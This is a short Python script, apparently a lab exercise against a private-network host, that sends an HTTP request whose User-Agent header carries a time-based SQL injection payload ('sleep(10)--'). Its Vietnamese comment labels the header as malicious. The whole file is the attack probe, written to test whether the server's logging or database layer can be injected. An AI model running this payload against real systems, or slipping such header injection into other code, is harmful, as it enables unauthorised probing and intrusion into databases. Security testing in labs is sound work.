import requests

target_ip = "http://192.168.1.11/"

# Tạo header độc hại
fake_headers = {
    'User-Agent': 'MyBrowser/1.0 (Windows) sleep(10)--'
}

try:
    print(f"Sending malicious User-Agent to {target_ip}...")
    response = requests.get(target_ip, headers=fake_headers)
    print("Request sent!")
except Exception as e:
    print(f"Error: {e}")